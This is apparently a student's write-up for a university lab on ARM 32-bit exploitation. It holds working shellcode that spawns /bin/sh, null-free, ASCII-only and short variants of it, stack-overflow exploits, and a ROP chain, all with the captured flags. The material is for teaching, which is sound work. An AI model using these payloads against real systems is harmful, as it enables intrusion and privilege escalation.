# Write-up for Unit2-2

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
#!/usr/bin/env python3
from pwn import *
```

- [Write-up for Unit2-2](#write-up-for-unit2-2)
  - [1-shellcode-arm](#1-shellcode-arm)
  - [2-nonzero-shellcode-arm](#2-nonzero-shellcode-arm)
  - [3-ascii-shellcode-arm](#3-ascii-shellcode-arm)
  - [4-short-shellcode-arm](#4-short-shellcode-arm)
  - [5-stack-ovfl-arm](#5-stack-ovfl-arm)
  - [6-stack-ovfl-use-envp-arm](#6-stack-ovfl-use-envp-arm)
  - [7-stack-ovfl-no-envp-arm](#7-stack-ovfl-no-envp-arm)
  - [8-rop0-arm](#8-rop0-arm)
    - [1. setregid(1020, 1020)](#1-setregid1020-1020)
    - [2. execve("/bin/sh", 0, 0)](#2-execvebinsh-0-0)
  - [(bonus) 9-rop1-arm](#bonus-9-rop1-arm)

## 1-shellcode-arm

The problem statement is below.

````md
Write a ARM shellcode that runs:

```c
setregid(getegid(), getegid())
execve("/bin/sh", 0, 0);
```

and put the shellcode binary (`shellcode.bin`) into this directory.
````

The given binary is arm 32bit.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ checksec 1/1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/home/TXK220008/unit2/1-shellcode-arm/1-shellcode-arm'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

This problem just requires you to translate what you solved in Unit2-1's level1.

The whole code will be like this.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, process

context.arch = 'arm'
# setregid(getegid(), getegid())
# getegid: 50(%r7)
# setregid: 71(%r7) (%r0 = gid_t rgid, %r1 = gid_t rgid)
shellcode = asm(
    """
mov     r7, 50
swi     0
mov     r1, r0
mov     r7, 71
swi     0
"""
)
# execve("/bin/sh", 0, 0)
# execve: 11(%r7) (%r0 = const char *filename, %r1 = const char *argv[], %r2 = const char *envp[])
shellcode += asm(
    """
adr     r0, _bin_sh
mov     r1, 0
mov     r2, 0
mov     r7, 11
swi     0
_bin_sh:
    .asciz "/bin/sh"
"""
)

with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)

```

Then, you get the flag.

```bash
TXK220008@ctf-vm3:~/unit2/1-shellcode-arm $ ./solve1.py; ./1-shellcode-arm
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
Reading shellcode from shellcode.bin
$ cat flag
CS6332{welcome_to_arm}
```

## 2-nonzero-shellcode-arm

The problem statement is below.

````md
Write a 32-bit shellcode that runs:

```c
setregid(getegid(), getegid())
execve("/bin/sh", 0, 0);
```

and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
````

This problem requires you to run the exactly same semantic code as the previous question.

1. To remove `0` from `swi 0`, use `swi 1010101` or `svc 1010101`.
   - The immediate value of `swi` or `svc` have nothing to do with its execution, so you can use`1010101` to remove `0x00` in binary.
2. To remove `0` and set `r0`'s value in `r1`, you can use the stack

   - Set `getegid`'s return value in `r1`

   ```armasm
   push    {r0, r1, r2, r3, r4, r5, r6, r7, r8}
   pop     {r1}
   ```

3. To remove in the second block, you can use the thumb mode.

   - This is how to enter the thumb mode and execute instructions in the thumb mode.

   ```armasm
   .code 32
   add     r2, pc, #1
   bx      r2
   .code 16
   adr     r0, binsh
   sub     r1, r1
   mov     r2, r1
   strb    r2, [r0, #7]
   mov     r7, 11
   svc     1
   binsh:
     .ascii "/bin/shX"
   ```

You've got the flag.

```bash
TXK220008@ctf-vm3:~/unit2/2-nonzero-shellcode-arm $ ./solve2.py ; ./2-nonzero-shellcode-arm
Reading shellcode from shellcode.bin
$ cat flag
CS6332{denUll1phi}
```

## 3-ascii-shellcode-arm

The problem statement is below.

```md
Can you write an arm32 shellcode without using non-ASCII characters
(i.e., charcodes from 0 upto 127)?
```

I will modify the code of `1-shellcode-arm` here.

```armasm
mov     r7, 50
swi     0
mov     r1, r0
mov     r7, 71
swi     0
adr     r0, _bin_sh
mov     r1, 0
mov     r2, 0
mov     r7, 11
swi     0
_bin_sh:
    .asciz "/bin/sh"
```

The first problem is `mov`. Its byte code contains some non-ascii code.

To make it ascii, you can convert it into `eorvc` which does not contain non-ascii. `swi`, which is equivalent to `svc` is equivalent to `svcvc`. It does not use an ascii character.

Since `pc` points to the instruction being fetched, you can convert `adr r0, _bin_sh` into `subvc r0, pc, #0` by reordering the instructions.

Finally, they become like this.

```armasm
eorvc   r7, r7
eorvc   r7, 50
svcvc   1
eorvc   r1, r1
eorvc   r1, r0
eorvc   r7, r7
eorvc   r7, 71
svcvc   1
eorvc   r1, r1
eorvc   r2, r2
eorvc   r7, r7
eorvc   r7, 11
subvc   r0, pc, #0
svcvc   1
binsh:
    .ascii "//bin/sh"
```

You've got the flag.

```bash
TXK220008@ctf-vm3:~/unit2/3-ascii-shellcode-arm $ ./solve3.py ; ./3-ascii-shellcode-arm
Reading shellcode from shellcode.bin
$ cat flag
CS6332{n0T_tH@T_H@Rd}
```

## 4-short-shellcode-arm

The problem statement is below.

```md
Can you write a non-zero shellcode without using more than 16 bytes, in arm32?
The program runs `setregid(getegid(), getegid())` for you.
```

Actually, this problem can be solved whithin 12 bytes.

First, embed shellcode, which we used in `2-nonzero-shellcode-arm`, as an environmental variable. Then just jump to the address where you embed the shellcode.

However, it is a little bit tricky because it uses a gigantic nop sled and an alignment.

To see where the shellcode is, you need to debug it in gdb. That's why you need a huge nop sled. gdb introduces some environmental variables and we haveto use a nop sled to avoid it. Also, the variable is on the stack, which means it is sometimes mal-aligned. I.e., instructions may not start with an address divisible by 4. To resolve it, add some alignments.

You can't use null bytes to jump. Use `movt` and `movw` to set 32bit address in a register like this.

```python
shellcode = asm(
    """
movw r5, #0xf55c
movt r5, #0xfffe
bx r5
"""
)
```

The total code is like this.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context

context.arch = "arm"
context.bits = 32

binshcode = asm("mov r8, r8") * 2000 # nop sled
binshcode += asm(
    """
.code 32
add     r2, pc, #1
bx      r2
.code 16
adr     r0, binsh
sub     r1, r1
mov     r2, r1
strb    r2, [r0, #7]
mov     r7, 11
svc     1
binsh:
    .ascii "/bin/shX"
"""
)
binshcode += b"a" # for alignment
with open("binshcode.bin", "wb") as binsh_file:
    binsh_file.write(binshcode)
shellcode = asm(
    """
movw r5, #0xf55c
movt r5, #0xfffe
bx r5
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)

```

You've got the flag.

```bash
TXK220008@ctf-vm3:~/unit2/4-short-shellcode-arm $ ./solve4.py; export a=`cat binshcode.bin`
TXK220008@ctf-vm3:~/unit2/4-short-shellcode-arm $ ./4-short-shellcode-arm
Reading shellcode from shellcode.bin
$ cat flag
CS6332{tHumbs_Up!}
```

## 5-stack-ovfl-arm

The problem statement is below.

```md
Can you put your shellcode on the buffer and run that by exploiting a buffer overflow vulnerability in the program?
```

This problem requires you to

- [ ] find a buffer start
- [ ] detect return address
- [ ] input sufficient number of characters to overflow it
- [ ] embed shellcode
- [ ] jump to the address of the shellcode

The given program tells you the buffer start.

```bash
TXK220008@ctf-vm3:~/unit2/5-stack-ovfl-arm $ ./5-stack-ovfl-arm
Your buffer is at: 0xfffef3f8
Please type your name:
```

- [x] find a buffer start

From the `stack-ovfl-arm.c`, you can tell the offset from the buffer. It's 80 bytes. You can also check it using `gdb`.

- [x] detect return address

Here, we embed the shellcode, input a sufficient number of `nop`s, and address of the shellcode.

```python
        bufAddr = int(r.split(b":")[1].split(b"\n")[0], 16)
        payload = [shellcode, asm("nop") * ((88 - len(shellcode)) // 2), p32(bufAddr)]
        payload = b"".join(payload)
```

- [x] input sufficient number of characters to overflow it
- [x] embed shellcode
- [x] jump to the address of the shellcode

You may encounter a problem that you can't execute it. Use loop and try-except to deal with it.

You've get the flag!

```bash
TXK220008@ctf-vm3:~/unit2/5-stack-ovfl-arm $ ./solve5.py
[+] Starting local process './5-stack-ovfl-arm': pid 562067
buffer address = fffefcd8
[*] Switching to interactive mode
Hello 0\x8f\xe2\xff/\xe12'\xdfFG'    F\xdf\xa0\xa1\xeb\xa2\xeb\xc2q\x0bA\xdf/bin/shX
$ cat flag
CS6332{sh3llc0de_0n_th3_St4ck}
```

## 6-stack-ovfl-use-envp-arm

The problem statement is below.

```md
Can you put your shellcode as one of the environmental variables
to put that on the stack and execute it via the vulnerability in the program?
```

Here are the tasks for this problem

- [ ] put shellcode in the environmental variable
- [ ] detect the location of the buffer
- [ ] detect the location of the return address
- [ ] overflow the buffer to input the address of environmental variable

From gdb debugging, the buffer address starts with `0xfffef0e4` and the return address is `0xfffef0ec`.

```gdb
read@plt (
   $r0 = 0x000000,
   $r1 = 0xfffef0e4 → 0x00000001,
   $r2 = 0x000014,
   $r3 = 0x000000
)
```

```gdb
gef➤  info frame
Stack level 0, frame at 0xfffef0f0:
 pc = 0x104ac in input_func; saved pc = 0x104ec
 called by frame at 0xfffef100
 Arglist at 0xfffef0d8, args:
 Locals at 0xfffef0d8, Previous frame's sp is 0xfffef0f0
 Saved registers:
  lr at 0xfffef0ec
```

The difference is 8 bytes, pad the buffer with 8 bytes. However, there still remains a problem.

The address `pwntools` touches is different from the address you touch in the normal gdb. To deal with it you need to use `gdb <program> core`, i.e., `gdb 6-stack-ovfl-use-envp-arm`.
Moreover, you need to pad `shellcode` to make the program aligned, i.e., make the starting address divisible by 4. I appended 3 bytes.

Here is how you check the address we want to jump to.

```gbd
TXK220008@ctf-vm3:~/unit2/6-stack-ovfl-use-envp-arm $ gdb 6-stack-ovfl-use-envp-arm core
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "arm-linux-gnueabihf".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.01ms using Python engine 3.9
Reading symbols from 6-stack-ovfl-use-envp-arm...
(No debugging symbols found in 6-stack-ovfl-use-envp-arm)
[New LWP 701717]
Core was generated by `./6-stack-ovfl-use-envp-arm'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffff12ea in ?? ()
gef➤  b
Breakpoint 1 at 0xffff12ea
gef➤  x/s *((char **)environ)
0xfffeff9a:     "SHELLCODE=\001\060\217\342\023\377/\341\062'\001\337\001FG'\tF\001\337\005\240\201\352\001\001\201\352\001\001\241\353\001\001\242\353\002\002\302q\v'\001\337/bin/shXaaa"
gef➤  x/s *((char **)environ) + 10
0xfffeffa4:     "\001\060\217\342\023\377/\341\062'\001\337\001FG'\tF\001\337\005\240\201\352\001\001\201\352\001\001\241\353\001\001\242\353\002\002\302q\v'\001\337/bin/shXaaa"
```

- [x] detect the location of the buffer
- [x] detect the location of the return address

Before that, you embed the environmental variable and get the address. You need to execute it and crash `solve6.py` first and then check the address.

```python
var_name = "SHELLCODE"
env = {var_name: shellcode}
io = process("./6-stack-ovfl-use-envp-arm", env=env)
```

- [x] put shellcode in the environmental variable
- [x] overflow the buffer to input the address of environmental variable

You've got the flag.

```bash
TXK220008@ctf-vm3:~/unit2/6-stack-ovfl-use-envp-arm $ ./solve6.py
[+] Starting local process './6-stack-ovfl-use-envp-arm': pid 702389
payload=b'\x00\xf0 \xe3\x00\xf0 \xe3\xa4\xff\xfe\xff'
4 <- jump_addr length
12 <- payload length
55 <- shellcode length
b'\xa4\xff\xfe\xff' <- jump_addr
b'Please type your name: \n'
b'Hello \n'
[*] Switching to interactive mode
$ cat flag
candl{V!@_enVp}
```

## 7-stack-ovfl-no-envp-arm

The problem statement is below.

```md
The program wipes envp. Can you put your shellcode on the stack and execute that?
```

Let's debug the program first.

The input buffer starts with `0xfffef0a4`.

```gdb
read@plt (
   $r0 = 0x000000,
   $r1 = 0xfffef0a4 → 0x0000000f,
   $r2 = 0x000014
)
```

And the return address is `0xfffef0ac`.

```gdb
gef➤  info frame
Stack level 0, frame at 0xfffef0b0:
 pc = 0x10518 in input_func; saved pc = 0x105a4
 called by frame at 0xfffef0d8
 Arglist at 0xfffef098, args:
 Locals at 0xfffef098, Previous frame's sp is 0xfffef0b0
 Saved registers:
  lr at 0xfffef0ac
```

The difference is 8, so input `8 bytes` and `an address to overwrite return address`.

The question is this program eradicate environmental variables. Instead of using an environmental variable, you are unable to use stdin too. What else can we use? It's the arguments.

We execute it with an argument, and input will be `{nop sled} + {argument address}`.

How do we find the starting address of the argument?

Just like `6-stack-ovfl-use-envp-arm`, first crash program with an argument and find the address using `gdb`. It is on the stack, so use `x/1000s $sp` in gdb to get it.

```bash
TXK220008@ctf-vm3:~/unit2/7-stack-ovfl-no-envp-arm $ ./solve7.py
[+] Starting local process './7-stack-ovfl-no-envp-arm': pid 789253
b'Please type your name: \n'
b'Hello \n'
[*] Switching to interactive mode
$ cat flag
candl{n0_ENVP_th1$_t1m3}
```

## 8-rop0-arm

The problem statement is below.

````md
Practice return-oriented Programming!
Call:

```c
    setregid(50000,50000);
    execve("/bin/sh", 0, 0);
```
````

When I execute the program, it says the following.

```bash
TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ./8-rop0-arm
Please call setregid(gid, gid);
You can check the gid by running 'cat /etc/group'
For example, the gid of week5-50001-ok is 50001
And then call execve("/bin/sh", 0, 0)
Or you can use a symlink
Please type your name:
aaa
Hello aaa
$!
```

I get my gid, which is `1020`.

```bash
TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ cat /etc/group | grep TXK
TXK220008:x:1020:
```

So, the task of this problem is to execute the following commands.

- [ ] `setregid(1020, 1020)`
- [ ] `execve("/bin/sh", 0, 0)`

Let's overflow the input buffer to do this.

We want to call two functions, `setregid` and `execve`, so the task is to use `input_func`'s return address to call multiple functions.

```gdb
[#0] 0x10594 → input_func()
[#1] 0x105ec → main()
```

Thus, what we need to do are

- [ ] detect buffer address
- [ ] get the addresses of syscalls
- [ ] send addresses and arguments by buffer overflow
  - [ ] the first package contains `setregid`, `1020`, and `1020`.
  - [ ] the second package contains `execve`, `"/bin/sh"`, `0`, `0`.

First, we check the buffer address. It is `0xffcd5118` from gdb.

```gdb
read@plt (
   $r0 = 0x000000,
   $r1 = 0xffcd5118 → 0x00000000,
   $r2 = 0x000100,
   $r3 = 0xffcd5118 → 0x00000000
)
read@plt (
   $r0 = 0x000000,
   $r1 = 0xffd828a8 → 0x00000000,
   $r2 = 0x000100,
   $r3 = 0xffd828a8 → 0x00000000
)
```

The saved address from `input_func` is `0xffcd5190`.
`0xffcd5190 - 0xffcd5118 = 120`, so first pad buffer with 120 bytes. However, to make the buffer overflow happen, you need 132 bytes. That's what we can know through debugging.

- [x] detect buffer address

You can learn the addresses of syscalls by reading `objdump -d ./8-rop0-arm`

```armasm
000103dc <execve@plt>:
   103dc:	e28fc600 	add	ip, pc, #0, 12
   103e0:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
   103e4:	e5bcfc3c 	ldr	pc, [ip, #3132]!	; 0xc3c

000103f4 <setregid@plt>:
   103f4:	e28fc600 	add	ip, pc, #0, 12
   103f8:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
   103fc:	e5bcfc2c 	ldr	pc, [ip, #3116]!	; 0xc2c
```

- [x] get the addresses of syscalls

Use `ropper` to find rop gadgets.

Start `ropper` and load the binary file.

```bash
TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ropper
(ropper)> file 8-rop0-arm
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
```

Look for useful instructions with `pop`.

```ropper
(8-rop0-arm/ELF/ARM)> search pop
[INFO] Searching for gadgets: pop

[INFO] File: 8-rop0-arm
0x00010514: pop {fp, pc};
0x00010388: pop {r3, pc};
0x000104f0: pop {r4, pc};
0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl #18; strdeq r0, r1, [r1], -r4; bx lr;
0x000104e0: popne {r4, pc}; bl #0x46c; mov r3, #1; strb r3, [r4]; pop {r4, pc};
```

Likewise, look for useful instructions with `mov`.

From them, these instructions can be used to set `r0`, `r1`, and `r2` for arguments and `r3` for calling a function.

```armasm
0x00010388: pop {r3, pc};
0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
```

We cannot use a string `"/bin/sh"` to call it, so use the symbolic link. `0x106EE` is `1` and us eit.

Suppose these are constants that will be used in my solution.

```python
# 0x00010388: pop {r3, pc};
rop3 = 0x00010388
# 0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
mov = 0x00010638
# 0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
rop4 = 0x00010650
# setregid
setregid = 0x000103F4
gid = 20007
# execve
execve = 0x000103DC
binsh = 0x106EE
offset = 132
JUNK = 0x4B4E554A
```

Then, do ROP. To set function in `r3`, first call `rop3`.

### 1. setregid(1020, 1020)

```python
payload += struct.pack("I", rop3)
payload += struct.pack("I", setregid)  # r3
```

And, then set the other arguments and call `setregid`.

```python
payload += struct.pack("I", rop4)
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", gid)  # r7 -> r0
payload += struct.pack("I", gid)  # r8 -> r1
payload += struct.pack("I", JUNK)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", mov)  # pc
```

### 2. execve("/bin/sh", 0, 0)

First, we are in `rop4`. Set `r4` to `pc` first. Set `rop3` at `pc`, and set `execve` in `r3` and `mov` in `pc` in `rop3`.

```python
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", binsh)  # r7 -> r0
payload += struct.pack("I", 0)  # r8 -> r1
payload += struct.pack("I", 0)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", rop3)  # pc
payload += struct.pack("I", execve)  # r3
payload += struct.pack("I", mov)  # pc
```

You've got the flag.

```bash
TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ./solve8.py
[+] Starting local process './8-rop0-arm': pid 333879
[*] Switching to interactive mode
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x88\x03!
$ cat flag
cs6332{pop_pop_pop_bx_pop_corn}
```

- [x] get the addresses of syscalls

## (bonus) 9-rop1-arm

The problem statement is below.

````md
Call:

```c
    open("flag", 0, 0);
    read(3, global_variable_addr, size);
    write(1, global_variable_addr, size);
```
````
